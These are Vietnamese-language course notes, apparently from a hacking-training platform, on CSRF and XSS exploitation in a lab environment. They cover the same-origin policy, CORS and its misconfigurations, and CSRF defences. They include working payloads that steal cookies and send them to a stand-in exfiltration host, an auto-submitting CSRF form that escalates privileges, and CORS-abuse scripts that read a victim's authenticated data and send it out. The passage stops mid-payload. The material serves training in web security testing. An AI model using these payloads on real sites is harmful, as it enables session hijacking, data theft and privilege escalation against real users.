# MỤC LỤC
# Introduction to Advanced CSRF & XSS Exploitation
-  [1. Giới thiệu về Khai thác XSS và CSRF nâng cao](#giới-thiệu-về-khai-thác-xss-và-csrf-nâng-cao)
-  [2. Giới thiệu về Môi trường Thực hành (Lab Environment)](#giới-thiệu-về-môi-trường-thực-hành-lab-environment)
-  [3. Khởi động Bài Thực Hành (Lab Warmup)](#khởi-động-bài-thực-hành-lab-warmup)
# Introduction to CSRF Exploitation
-  [4. Giới thiệu về Khai thác CSRF](#giới-thiệu-về-khai-thác-csrf)
-  [5. Giới thiệu Same-Origin Policy và CORS](#giới-thiệu-same-origin-policy-và-cors)
-  [6. Giới thiệu CORS Misconfigurations](#giới-thiệu-cors-misconfigurations)
-  [7. Bypassing CSRF Tokens via CORS Misconfigurations](#bypassing-csrf-tokens-via-cors-misconfigurations)
-  [8. Miscellaneous CSRF Exploitation](#miscellaneous-csrf-exploitation)
# Introduction to XSS Exploitation
-  [9. Giới thiệu về Khai thác XSS (Cross-Site Scripting)](#giới-thiệu-về-khai-thác-xss-cross-site-scripting)
-  [10. Khai thác Tấn công từ Sessions (Phiên làm việc) của Nạn nhân](#khai-thác-tấn-công-từ-sessions-phien-lam-việc-của-nạn-nhân)
-  [11. Liệt kê các API nội bộ thông qua lỗ hổng XSS](#liệt-kê-các-api-nội-bộ-thông-qua-lỗ-hổng-xss)
-  [12. Khai thác ứng dụng Web nội bộ](#khai-thác-ứng-dụng-web-nội-bộ)
# Content Security Policy (CSP)
-  [13. Chính sách bảo mật nội dung (CSP)](#chính-sách-bảo-mật-nội-dung-csp)
-  [14. Bypass CSP](#bypass-csp)
-  [15. Bypass Bộ Lọc XSS](#bypass-bộ-lọc-xss)
---
---
# Giới thiệu về Khai thác XSS và CSRF nâng cao

#### 1. **Giới thiệu về Khai thác CSRF & XSS Nâng cao**

Trong phần này, chúng ta sẽ tìm hiểu về cách khai thác lỗ hổng **Cross-Site Request Forgery (CSRF)** và **Cross-Site Scripting (XSS)** trong các ứng dụng web hiện đại. Mục tiêu là viết các payload tùy chỉnh để thực hiện các hành động tấn công cụ thể.

**Yêu cầu kiến thức nền tảng**:
- Hiểu biết về **JavaScript** và các lỗ hổng bảo mật như **CSRF**, **XSS**, và **SQL Injection** là cần thiết để theo dõi nội dung.
- Khuyến khích bạn hoàn thành các module về **XSS**, **Session Security**, và **SQL Injection Fundamentals** trước khi bắt đầu.

#### 2. **Khai thác CSRF và XSS trong Thực tế**

Hiện nay, nhiều trình duyệt web đã bổ sung các chính sách và cơ chế bảo mật nhằm ngăn chặn các khai thác CSRF đơn giản như:
- **Same-Origin Policy**: Chính sách ngăn không cho các trang web khác nhau truy cập tài nguyên của nhau nếu không cùng một nguồn gốc.
- **CORS (Cross-Origin Resource Sharing)**: Cơ chế chia sẻ tài nguyên giữa các nguồn khác nhau.
- **SameSite Cookies**: Thiết lập cookie chỉ cho phép gửi khi yêu cầu đến từ cùng một trang web.

Vì thế, việc khai thác CSRF truyền thống đã trở nên hiếm hơn trong thực tế. Tuy nhiên, nếu phát hiện một lỗ hổng XSS, ta có thể kết hợp khai thác cả **XSS** và **CSRF** để thực hiện các tấn công phức tạp hơn, không chỉ trên ứng dụng web đang bị tấn công mà còn có thể tấn công thêm các ứng dụng khác nằm trong mạng nội bộ của nạn nhân.

#### 3. **Sử dụng `XMLHttpRequest` và `Fetch API` để khai thác**

Để khai thác lỗ hổng CSRF và XSS, chúng ta có thể sử dụng **`XMLHttpRequest`** hoặc **`Fetch API`** để gửi các yêu cầu HTTP từ mã JavaScript. Chúng ta có thể chỉ định các tham số HTTP như phương thức, header, hoặc nội dung của yêu cầu.

##### **Ví dụ 1: Sử dụng `XMLHttpRequest` để gửi yêu cầu POST**

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://exfiltrate.htb/', false);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('param1=hello&param2=world');
```

- **Giải thích**:
  - `xhr.open()`: Mở một yêu cầu POST đến URL `http://exfiltrate.htb/`.
  - `xhr.setRequestHeader()`: Thiết lập header `Content-Type` để chỉ định loại dữ liệu là `application/x-www-form-urlencoded`.
  - `xhr.send()`: Gửi yêu cầu với dữ liệu `param1=hello&param2=world`.

##### **Ví dụ 2: Sử dụng `Fetch API` để gửi yêu cầu POST**

```javascript
const response = await fetch('http://exfiltrate.htb/', {
  method: "POST",
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'param1=hello&param2=world',
});
```

- **Giải thích**:
  - `fetch()`: Hàm `fetch` nhận URL là tham số đầu tiên.
  - Tham số thứ hai là một đối tượng chứa các tham số của yêu cầu HTTP như phương thức, header, và nội dung.
  - `body`: Chứa dữ liệu sẽ được gửi trong yêu cầu POST.

---
# Giới thiệu về Môi trường Thực hành (Lab Environment)

#### **1. Giới thiệu về Môi trường Thực hành**

Trong module này, tất cả các bài lab sẽ tuân theo một cấu trúc chung với các **máy chủ ảo (virtual hosts)** được sử dụng để phát triển, tinh chỉnh, và thực hiện các khai thác của chúng ta. Phần này sẽ thảo luận về các công cụ có sẵn và cách chúng ta sử dụng chúng để khai thác các lỗ hổng **CSRF** và **XSS** khác nhau.

#### **2. Các Thành phần của Môi trường Lab**

Môi trường lab sẽ bao gồm các thành phần chính sau:

- **Máy chủ Exfiltration**: `exfiltrate.htb`
- **Máy chủ Phát triển Khai thác**: `exploitserver.htb`
- **Ứng dụng web dễ bị tấn công**: `vulnerablesite.htb`

Chúng ta sẽ lần lượt đi qua các thành phần này và giải thích vai trò của chúng trong việc khai thác lỗ hổng.

#### **3. Máy chủ Exfiltration (`exfiltrate.htb`)**

Máy chủ exfiltration được sử dụng để thu thập và lưu trữ dữ liệu bị rò rỉ từ các yêu cầu HTTP. Máy chủ này sẽ ghi lại tất cả các tham số của các yêu cầu được gửi đến, bao gồm các tham số **GET**, **POST**, và các **HTTP headers**.

- **Truy cập log**: Bạn có thể truy cập log tại endpoint `/log` để xem tất cả dữ liệu bị rò rỉ.

##### **Ví dụ về Exfiltration**

Giả sử chúng ta muốn rò rỉ dữ liệu qua hai tham số là `param1` và `param2`, chúng ta có thể sử dụng lệnh sau:

```bash
curl -X POST --data 'param1=Hello' http://exfiltrate.htb?param2=World
```

Sau đó, chúng ta có thể kiểm tra log để xem dữ liệu đã được rò rỉ:

```bash
curl http://exfiltrate.htb/log
```

- **Phản hồi từ máy chủ log**:

```
/?param2=World
Host: exfiltrate.htb
User-Agent: curl/7.88.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 172.17.0.1
Content-Length: 12
param1=Hello
```

Chúng ta cũng có thể truy cập log qua trình duyệt web bằng cách vào URL `http://exfiltrate.htb/log`.

#### **4. Máy chủ Phát triển Khai thác (`exploitserver.htb`)**

Máy chủ này được sử dụng để phát triển các payload khai thác CSRF hoặc XSS. Nó cho phép chúng ta viết các khai thác tùy chỉnh nhằm mục tiêu vào các lỗ hổng mà chúng ta tìm thấy trên ứng dụng web dễ bị tấn công.

- **Ví dụ về Proof-of-Concept cho XSS**:
  Giả sử chúng ta muốn tạo một payload XSS đơn giản để hiển thị một hộp thông báo (alert):

  ```html
  <script>alert('XSS Detected!')</script>
  ```

- **Truy cập Payload**:
  Sau khi lưu payload, bạn có thể xem payload này bằng cách truy cập vào endpoint `/exploit`. Truy cập này sẽ kích hoạt hộp thông báo pop-up.

- **Triển khai Payload cho Nạn nhân**:
  Để nạn nhân kích hoạt payload, chúng ta có thể gửi cho họ một liên kết dẫn đến `http://exploitserver.htb/exploit`. Điều này rất hữu ích cho các cuộc tấn công CSRF, nơi nạn nhân cần tự nguyện truy cập payload để kích hoạt mã khai thác.

#### **5. Phát triển Payload XSS**

Máy chủ phát triển khai thác cũng có thể được sử dụng để tạo các payload XSS. Tuy nhiên, không giống như các cuộc tấn công CSRF, chúng ta không cần phải gửi payload cho nạn nhân. Với XSS, payload sẽ được tự động thực thi bởi mã JavaScript đã được tiêm vào ứng dụng web dễ bị tấn công.

- **Ví dụ về Payload XSS để Đánh cắp Cookie**:

  ```html
  <script>
    window.location = "http://exfiltrate.htb/cookiestealer?c=" + document.cookie;
  </script>
  ```

Payload trên sẽ tự động gửi cookie của người dùng đến máy chủ exfiltration. Khi quản trị viên truy cập vào trang chứa payload này, cookie của họ sẽ bị đánh cắp và ghi lại tại máy chủ log.

---
# Khởi động Bài Thực Hành (Lab Warmup)

Sau khi tìm hiểu về các thành phần trong môi trường lab, chúng ta sẽ khám phá cách khai thác một số lỗ hổng cơ bản thông qua các ví dụ về **XSS** và **CSRF**.

#### **1. Khởi động với XSS**

Ứng dụng web mẫu của chúng ta là một **guestbook** đơn giản cho phép người dùng đăng bài. Tất cả người dùng đều có thể xem các bài đăng này, và quản trị viên thường xuyên kiểm tra để loại bỏ các bài spam.

**Xác nhận lỗ hổng XSS**: Chúng ta có thể kiểm tra lỗ hổng XSS bằng cách đăng nội dung sau vào guestbook:

```html
<script>alert(1)</script>
```

Khi quản trị viên mở trang guestbook, một hộp thoại sẽ hiện ra, chứng tỏ rằng có một lỗ hổng XSS tồn tại.

**Phát triển khai thác đánh cắp cookie**: Chúng ta sẽ sử dụng máy chủ phát triển khai thác (`exploitserver.htb`) để tạo payload nhằm đánh cắp cookie của quản trị viên.

```html
<script src="http://exploitserver.htb/exploit"></script>
```

Payload này sẽ tải một đoạn mã từ máy chủ khai thác. Đoạn mã này sẽ gửi cookie của quản trị viên đến máy chủ exfiltration (`exfiltrate.htb`):

```javascript
window.location = "http://exfiltrate.htb/cookiestealer?c=" + document.cookie;
```

- **Lưu payload**: Sau khi lưu payload trên máy chủ khai thác, bạn có thể kiểm tra payload bằng cách truy cập endpoint `/exploit`.
- **Chờ quản trị viên truy cập**: Khi quản trị viên mở trang guestbook, mã XSS được chèn vào sẽ tải payload từ máy chủ khai thác và gửi cookie của quản trị viên đến máy chủ exfiltration. Chúng ta có thể xem cookie bị đánh cắp tại endpoint `/log` của máy chủ `exfiltrate.htb`.

#### **2. Khởi động với CSRF**

Ứng dụng web mẫu này vẫn đang trong quá trình phát triển, nên nó không có nhiều chức năng. Tuy nhiên, chúng ta có thể thấy rằng người dùng chỉ có quyền hạn **user**, nhưng có một nút **promote** để thăng cấp người dùng.

- Khi nhấn nút này, ứng dụng web thông báo rằng chỉ quản trị viên mới có quyền thăng cấp người dùng. Tuy nhiên, endpoint này không có bất kỳ biện pháp bảo vệ nào chống lại **CSRF**, điều này cho phép chúng ta thực hiện một cuộc tấn công CSRF để yêu cầu quản trị viên thăng cấp tài khoản của chúng ta.

**Tạo form CSRF**:

```html
<html>
  <body>
    <form method="GET" action="http://csrf.vulnerablesite.htb/profile.php">
      <input type="hidden" name="promote" value="htb-stdnt" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

- Form này sẽ gửi yêu cầu thăng cấp tài khoản khi người dùng bấm nút **Submit request**.

**Tự động gửi form**: Để tấn công mà không cần tương tác từ người dùng, chúng ta sẽ thêm mã JavaScript để tự động gửi form khi trang được tải:

```html
<script>
  document.forms[0].submit();
</script>
```

- **Payload hoàn chỉnh**:

```html
<html>
  <body>
    <form method="GET" action="http://csrf.vulnerablesite.htb/profile.php">
      <input type="hidden" name="promote" value="htb-stdnt" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Kiểm tra payload**: Chúng ta có thể kiểm tra payload này bằng cách nhấp vào **View Exploit** trên máy chủ khai thác khi đã đăng nhập vào ứng dụng dễ bị tấn công. Payload sẽ tự động gửi yêu cầu đến `http://csrf.vulnerablesite.htb/profile.php` để yêu cầu thăng cấp tài khoản. Tuy nhiên, do chúng ta không phải là quản trị viên, yêu cầu sẽ bị từ chối.

- **Xác nhận yêu cầu**: Điều này xác nhận rằng payload CSRF đã gửi thành công yêu cầu HTTP để thăng cấp tài khoản.

**Thực hiện tấn công**: Để tấn công thành công, chúng ta sẽ gửi payload này cho nạn nhân (quản trị viên). Khi quản trị viên truy cập vào payload tại `http://exploitserver.htb/exploit`, yêu cầu sẽ được gửi với quyền quản trị viên. Sau một vài giây, chúng ta có thể kiểm tra và thấy rằng tài khoản của chúng ta đã được thăng cấp lên quyền admin.

#### **3. Lưu ý khi làm bài lab**

- Mỗi bài lab đều có một người dùng nạn nhân được mô phỏng. Nạn nhân có thể mất một khoảng thời gian để truy cập payload, vì vậy hãy đảm bảo kiểm tra payload trước và kiên nhẫn chờ đợi.
- Các khai thác đã được kiểm thử trên phiên bản trình duyệt **Chromium 114.0.5735.90**. Do các thay đổi gần đây về xử lý cookie của bên thứ ba, các khai thác có thể không hoạt động trên các phiên bản trình duyệt mới hơn.
- Hãy xóa tất cả cookie khi chuyển từ bài lab này sang bài lab khác để tránh xung đột cookie từ các bài lab trước đó.

---
# Giới thiệu về Khai thác CSRF

Trước khi đi sâu vào chi tiết khai thác lỗ hổng **CSRF**, chúng ta sẽ cùng ôn lại kiến thức cơ bản về CSRF và các biện pháp phòng thủ thông thường.

#### **1. Tóm tắt về CSRF (Cross-Site Request Forgery)**

**Cross-Site Request Forgery (CSRF)** là một kiểu tấn công web, trong đó payload của kẻ tấn công ép trình duyệt của nạn nhân thực hiện các hành động không mong muốn trên một ứng dụng web mà nạn nhân đã xác thực. Các cuộc tấn công CSRF thường được thực hiện thông qua một payload trên trang web do kẻ tấn công kiểm soát, gửi các yêu cầu **cross-origin** đến ứng dụng web dễ bị tấn công.

- Để cuộc tấn công thành công, nạn nhân phải truy cập vào trang web của kẻ tấn công, có thể thông qua **social engineering** hoặc các hình thức lừa đảo khác.
- Yêu cầu **cross-origin** sẽ được gửi kèm với cookie phiên của nạn nhân, do đó yêu cầu sẽ được xác thực và thực hiện hành động thay đổi trên ứng dụng web.

**Ví dụ minh họa**:
- Nạn nhân là quản trị viên của trang `http://vulnerablesite.htb` và đã đăng nhập, trình duyệt lưu trữ một cookie phiên hợp lệ.
- Trang web không có bảo vệ chống lại CSRF.
- Kẻ tấn công có một tài khoản có quyền hạn thấp trên ứng dụng web và muốn thực hiện tấn công CSRF để nâng quyền thành quản trị viên.

Khi nạn nhân truy cập vào trang của kẻ tấn công tại `http://exploitserver.htb`, trang này sẽ thực thi mã JavaScript sau:

```javascript
fetch("http://vulnerablesite.htb/promote?user=attacker", {
  method: "GET",
  credentials: "include"
});
```

- Trình duyệt của nạn nhân sẽ gửi yêu cầu này kèm với cookie phiên, yêu cầu sẽ được xác thực.
- Do đó, tài khoản của kẻ tấn công được nâng quyền lên quản trị viên thành công.

#### **2. Các biện pháp phòng thủ chống lại CSRF**

Có nhiều cơ chế bảo vệ khác nhau để chống lại các cuộc tấn công CSRF, hầu hết dựa vào các hạn chế được áp dụng bởi **Same-Origin Policy**.

##### **Biện pháp 1: CSRF Tokens**

**CSRF Token** là một giá trị ngẫu nhiên và duy nhất cần được gửi kèm theo các yêu cầu thực hiện thay đổi quan trọng trên ứng dụng web (ví dụ như gửi form HTML). Token này phải đủ khó đoán để kẻ tấn công không thể biết trước giá trị của nó.

- **Kiểm tra CSRF Token**: Ứng dụng web cần kiểm tra giá trị của CSRF token trước khi thực hiện thay đổi quan trọng.
- Token không nên được gửi qua cookie, vì điều này sẽ làm cho bảo vệ CSRF trở nên không hiệu quả.

**Ví dụ**:
- Ứng dụng web chỉ chấp nhận yêu cầu nâng quyền có chứa tham số `user` và token CSRF `csrf_token`:

```html
<form method="POST" action="/promote">
  <input type="hidden" name="user" value="attacker" />
  <input type="hidden" name="csrf_token" value="random_value" />
  <button type="submit">Promote</button>
</form>
```

- Token CSRF là một giá trị ngẫu nhiên mà kẻ tấn công không thể đoán được, do đó yêu cầu CSRF từ kẻ tấn công sẽ không có token hợp lệ và sẽ bị từ chối.

##### **Biện pháp 2: Kiểm tra HTTP Headers**

Ngoài CSRF Tokens, ứng dụng web có thể sử dụng các HTTP headers như **Origin** hoặc **Referer** để bảo vệ khỏi các cuộc tấn công CSRF.

- **Header `Origin`**: Được trình duyệt thêm vào các yêu cầu **cross-origin** để chỉ rõ nguồn gốc của yêu cầu. Kẻ tấn công không thể kiểm soát giá trị của header này, do đó ứng dụng web có thể kiểm tra giá trị của `Origin` để xác định xem yêu cầu có đến từ nguồn gốc hợp lệ không.

**Ví dụ**:
```bash
Origin: http://exploitserver.htb
```

- Nếu `Origin` khác với nguồn gốc hợp lệ của ứng dụng web, yêu cầu sẽ bị từ chối.

- **Header `Referer`**: Chỉ rõ URL mà yêu cầu được gửi từ. Cơ chế này tương tự như `Origin` và có thể được sử dụng để xác định nguồn gốc của yêu cầu.

##### **Biện pháp 3: SameSite Cookies**

Thuộc tính **SameSite** của cookie là một cơ chế bảo vệ khác chống lại CSRF. Thuộc tính này xác định liệu cookie có được gửi cùng với các yêu cầu **cross-origin** hay không. Giá trị của **SameSite** có thể là:

- **Strict**: Cookie chỉ được gửi khi yêu cầu đến từ cùng một trang web (không hỗ trợ cross-origin).
- **Lax**: Cookie sẽ được gửi với các yêu cầu GET cross-origin, nhưng không phải POST (đây là thiết lập mặc định trên các trình duyệt hiện đại).
- **None**: Cookie sẽ được gửi kèm với tất cả các yêu cầu cross-origin, nhưng cần phải có thuộc tính **Secure** (yêu cầu HTTPS).

**Ví dụ**:

```bash
Set-Cookie: session_id=abcd1234; SameSite=Lax
```

- Với thiết lập này, cookie sẽ không được gửi kèm với các yêu cầu POST cross-origin, giúp giảm nguy cơ tấn công CSRF.

---
# Giới thiệu Same-Origin Policy và CORS

#### **1. Same-Origin Policy là gì?**

**Same-Origin Policy** là một cơ chế bảo mật được triển khai trong các trình duyệt web để ngăn chặn việc truy cập chéo giữa các trang web (cross-origin access). Cụ thể:

- Mã JavaScript chạy trên một **origin** không thể truy cập tài nguyên từ một **origin** khác.
- Cơ chế này giúp ngăn chặn các trang web độc hại đánh cắp dữ liệu từ các trang web khác và hạn chế các yêu cầu mà trang web có thể thực hiện đến các **origin** khác.

**Origin** được xác định bởi ba yếu tố trong URL:
1. **Scheme** (giao thức): HTTP hoặc HTTPS.
2. **Host** (tên miền).
3. **Port** (cổng).

**Ví dụ**:
- `http://example.com` và `https://example.com` là hai **origin** khác nhau vì khác nhau về **scheme**.
- `https://academy.hackthebox.com` và `https://hackthebox.com` là hai **origin** khác nhau vì khác nhau về **host**.
- `https://hackthebox.com` và `https://hackthebox.com:443` là cùng một **origin** vì **scheme**, **host**, và **port** đều giống nhau (cổng mặc định của HTTPS là 443).

#### **2. Tại sao Same-Origin Policy quan trọng?**

Hãy tưởng tượng nếu không có Same-Origin Policy, một trang web độc hại như `https://exploitationserver.htb` có thể thực thi mã JavaScript để gửi các yêu cầu **cross-origin** đến các trang web khác mà người dùng đang đăng nhập, như:

- `https://mymails.htb/getmails`: Lấy email của người dùng.
- `https://mybank.htb/myaccounts`: Lấy thông tin tài khoản ngân hàng.
- `https://192.168.178.5/`: Truy cập vào dịch vụ nội bộ của người dùng.

**Ví dụ**:

```javascript
fetch("https://mymails.htb/getmails");
fetch("https://mybank.htb/myaccounts");
fetch("https://192.168.178.5/");
```

- Nếu người dùng đang đăng nhập vào các trang này, trình duyệt sẽ gửi cookie phiên cùng với các yêu cầu, khiến các yêu cầu này được xác thực.
- Mã JavaScript sau đó có thể gửi kết quả về máy chủ của kẻ tấn công, cho phép kẻ tấn công truy cập email, thông tin tài khoản ngân hàng, và các dịch vụ nội bộ mà nạn nhân không hề hay biết.

#### **3. Lợi ích của Same-Origin Policy**

Với Same-Origin Policy, trình duyệt sẽ chặn mã JavaScript từ `https://exploitationserver.htb` khi nó cố gắng truy cập dữ liệu từ các **origin** khác như `https://mymails.htb`. Mã JavaScript sẽ gây ra lỗi và không thể truy cập được dữ liệu.

**Lưu ý**: Mặc dù trình duyệt chặn việc truy cập dữ liệu, nhưng yêu cầu **cross-origin** vẫn được gửi đi. Điều này có thể dẫn đến các cuộc tấn công **CSRF** nếu không có biện pháp bảo vệ phù hợp.

#### **4. Ngoại lệ của Same-Origin Policy**

Một số tài nguyên như **img**, **video**, và **script** có thể được tải từ các **origin** khác mà không bị chặn bởi Same-Origin Policy. Ví dụ:

```html
<img src="https://academy.hackthebox.com/images/logo.svg" />
```

Trong trường hợp này, hình ảnh từ `https://academy.hackthebox.com` có thể được tải trên một trang web khác mà không gặp lỗi.

#### **5. CORS là gì?**

**Cross-Origin Resource Sharing (CORS)** là một tiêu chuẩn của W3C cho phép các trang web cấu hình ngoại lệ cho Same-Origin Policy. CORS cho phép một **origin** định nghĩa danh sách các **origin** đáng tin cậy và các phương thức HTTP mà nó cho phép truy cập từ các **origin** khác.

#### **6. Tại sao cần CORS?**

Trong thực tế, nhiều ứng dụng web hiện đại chỉ có phần giao diện (frontend) và sẽ lấy dữ liệu từ một API riêng biệt. Ví dụ:

- Ứng dụng tại `http://vulnerablesite.htb` lấy dữ liệu từ API tại `http://api.vulnerablesite.htb`.

**Mã JavaScript ví dụ**:

```javascript
fetch("http://api.vulnerablesite.htb/data", {
  method: "GET"
}).then((response) => {
  console.log(response);
});
```

- Mã này sẽ gây lỗi vì **Same-Origin Policy** ngăn không cho JavaScript từ `http://vulnerablesite.htb` truy cập vào API tại `http://api.vulnerablesite.htb`.

#### **7. CORS hoạt động như thế nào?**

Máy chủ API có thể cấu hình ngoại lệ cho Same-Origin Policy bằng cách thiết lập các **CORS headers** trong phản hồi HTTP. Một trong các header quan trọng là **Access-Control-Allow-Origin**.

**Ví dụ**:

```http
Access-Control-Allow-Origin: http://vulnerablesite.htb
```

- Header này cho phép **origin** `http://vulnerablesite.htb` truy cập tài nguyên từ API. Khi trình duyệt thấy header này, nó sẽ cho phép mã JavaScript truy cập dữ liệu mà không gây ra lỗi.

#### **8. Yêu cầu đơn giản và Yêu cầu Preflight**

- **Yêu cầu đơn giản**: Là các yêu cầu **GET**, **HEAD**, hoặc **POST** với **Content-Type** là `application/x-www-form-urlencoded`, `multipart/form-data`, hoặc `text/plain`.
- **Yêu cầu Preflight**: Là một yêu cầu **OPTIONS** mà trình duyệt gửi trước để kiểm tra xem máy chủ có cho phép yêu cầu **cross-origin** hay không. Nếu máy chủ phản hồi với các header CORS cho phép, trình duyệt sẽ gửi yêu cầu chính thức tiếp theo.

**Ví dụ về Header Preflight**:

```http
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type
Access-Control-Allow-Credentials: true
```

---
# Giới thiệu CORS Misconfigurations

Trong phần này, chúng ta sẽ tìm hiểu các cấu hình sai (misconfigurations) phổ biến của **CORS** có thể dẫn đến lỗ hổng bảo mật trong các ứng dụng web và cách nhận diện chúng.

#### **1. Hậu quả của CORS Misconfigurations**

Cấu hình sai CORS có thể tạo ra nhiều kiểu tấn công nguy hiểm, đặc biệt khi header **Access-Control-Allow-Credentials** được thiết lập là `true`. Điều này cho phép trình duyệt gửi cookie và thông tin xác thực trong các yêu cầu **cross-origin**.

**Ví dụ về khai thác**:

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
  xhr.withCredentials = true;
  xhr.onload = () => {
    location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
  };
  xhr.send();
</script>
```

- Payload này gửi yêu cầu **cross-origin** đến `http://api.vulnerablesite.htb/data` và gửi kèm thông tin xác thực (cookie).
- Nếu nạn nhân truy cập vào trang chứa payload tại `http://exploitserver.htb/exploit`, yêu cầu sẽ được gửi kèm cookie của nạn nhân. Kết quả sẽ bị gửi đến máy chủ của kẻ tấn công tại `http://exfiltrate.htb/log`.
- Lỗ hổng này cho phép kẻ tấn công truy cập dữ liệu từ API mặc dù họ không có thông tin xác thực.

#### **2. CORS Misconfiguration 1: Improper Origin Whitelist**

**Bối cảnh**:

- Thay vì phản hồi với bất kỳ **origin** nào, ứng dụng web cần kiểm tra **origin** dựa trên danh sách các **origin** đáng tin cậy. Nếu kiểm tra không đúng cách, kẻ tấn công có thể vượt qua kiểm tra này.
- Ví dụ: API tại `http://api.vulnerablesite.htb` xác thực header `Origin` bằng cách kiểm tra xem nó có kết thúc bằng chuỗi `"vulnerablesite.htb"` không. Điều này không chỉ bao gồm các subdomain mà còn cả các domain kết thúc bằng `"vulnerablesite.htb"`.

**Khai thác**:

- Kẻ tấn công có thể sử dụng một **origin** như `http://attackervulnerablesite.htb` để vượt qua kiểm tra.
- Payload tương tự như phần trước, nhưng payload được lưu trữ tại một **origin** có hậu tố `"vulnerablesite.htb"`, vượt qua kiểm tra sai sót của API.

#### **3. CORS Misconfiguration 2: Trusted Null Origin**

**Bối cảnh**:

- Một số ứng dụng web tin tưởng **null origin**, dẫn đến lỗ hổng khi mã JavaScript được tải trong một iframe có thuộc tính `sandbox`.
- Khi iframe có thuộc tính `sandbox`, **origin** sẽ là `null`, nhưng trình duyệt vẫn gửi yêu cầu.

**Payload khai thác**:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
      location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
    };
    xhr.send();
  </script>">
</iframe>
```

- Payload này gửi yêu cầu **cross-origin** từ một iframe có **null origin**, và dữ liệu được gửi đến máy chủ exfiltration.

#### **4. CORS Misconfiguration 3: Wildcard Origin (`*`)**

**Bối cảnh**:

- Nếu API sử dụng **Access-Control-Allow-Origin** là `*`, mọi **origin** đều được phép truy cập.
- Điều này đặc biệt nguy hiểm khi API được truy cập từ mạng nội bộ mà không yêu cầu xác thực.

**Ví dụ khai thác**:

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://172.16.0.2/data', true);
  xhr.onload = () => {
    location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
  };
  xhr.send();
</script>
```

- Payload này gửi yêu cầu đến API nội bộ `http://172.16.0.2/data`. Nếu nạn nhân ở trong cùng mạng nội bộ, dữ liệu sẽ bị exfiltrated đến máy chủ của kẻ tấn công.

#### **5. Tinh chỉnh Payload và Kỹ thuật Exfiltration**

Trong một số trường hợp, payload có thể gặp lỗi nếu dữ liệu phản hồi quá lớn để gửi qua URL (GET request). Để tối ưu payload, chúng ta có thể:

- **Sử dụng POST request** thay vì GET.
- **Chia nhỏ dữ liệu** và gửi qua nhiều yêu cầu nhỏ hơn.
- **Phân tích và chỉ exfiltrate các phần dữ liệu quan trọng**.

**Ví dụ tinh chỉnh Payload**:

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
  xhr.withCredentials = true;
  xhr.onload = () => {
    var doc = new DOMParser().parseFromString(xhr.response, 'text/html');
    var msg = encodeURIComponent(doc.getElementById('secret').innerHTML);
    location = 'https://exfiltrate.htb/log?data=' + btoa(msg);
  };
  xhr.send();
</script>
```

- Payload này chỉ exfiltrate phần tử có ID là `"secret"` trong phản hồi HTML, giúp giảm kích thước dữ liệu.

#### **6. Lưu ý khi thực hiện tấn công CORS**

- **Cài đặt cookie của bên thứ ba (third-party cookies)** trong trình duyệt có thể ngăn không cho payload hoạt động. Tuy nhiên, khi gửi payload cho nạn nhân, vấn đề này thường không xảy ra. Hãy kiểm tra lỗi liên quan đến cookie trong **JavaScript console** và điều chỉnh cấu hình trình duyệt nếu cần.

---
# Bypassing CSRF Tokens via CORS Misconfigurations

#### **1. Tổng quan về Bypass CSRF Token qua CORS Misconfigurations**

Các cấu hình sai của **CORS** không chỉ tạo ra lỗ hổng bảo mật về dữ liệu mà còn có thể được sử dụng để vượt qua các biện pháp phòng thủ **CSRF** ngay cả khi chúng đã được triển khai đúng cách.

- Khi CORS được cấu hình sai với header **Access-Control-Allow-Credentials** là `true`, trình duyệt sẽ gửi cookie phiên cùng với yêu cầu **cross-origin**, điều này làm vô hiệu hóa Same-Origin Policy.
- Trong trường hợp này, các biện pháp phòng thủ CSRF thông thường sẽ không hiệu quả, vì kẻ tấn công có thể truy cập phản hồi của yêu cầu cross-origin và sử dụng token CSRF hợp lệ.

#### **2. Vượt qua CSRF Token thông qua CORS Misconfiguration**

Nếu kẻ tấn công có thể vượt qua Same-Origin Policy bằng cách khai thác CORS misconfiguration, họ có thể:

1. **Gửi yêu cầu cross-origin** để lấy token CSRF hợp lệ.
2. **Đọc token CSRF** từ phản hồi.
3. **Gửi yêu cầu thay đổi trạng thái** kèm theo token CSRF hợp lệ.

Vì tất cả các yêu cầu này đều được thực hiện trong phiên của nạn nhân, token CSRF sẽ hợp lệ, ngay cả khi được kiểm tra đúng cách.

**Yêu cầu**:
- Cookie phiên cần được gửi kèm theo yêu cầu cross-origin từ JavaScript. Để điều này xảy ra, ứng dụng web phải thiết lập thuộc tính **SameSite=None** và **Secure** cho cookie, cho phép cookie được gửi qua kết nối HTTPS.

#### **3. Phân tích ứng dụng web và phát hiện CORS Misconfiguration**

Giả sử chúng ta phát hiện rằng ứng dụng web tại `https://vulnerablesite.htb` thiết lập các header sau trong phản hồi:

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Điều này cho phép các yêu cầu cross-origin được gửi kèm thông tin xác thực (cookies), ngay cả khi các biện pháp bảo vệ CSRF được triển khai.

#### **4. Khai thác CORS Misconfiguration để vượt qua CSRF Protection**

Ứng dụng web có chức năng thăng cấp người dùng lên quyền quản trị viên, và yêu cầu POST được bảo vệ bởi token CSRF. Token CSRF được trả về khi gửi yêu cầu GET đến `/profile.php`.

**Payload để lấy CSRF Token**:

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerablesite.htb/profile.php', false);
xhr.withCredentials = true;
xhr.send();

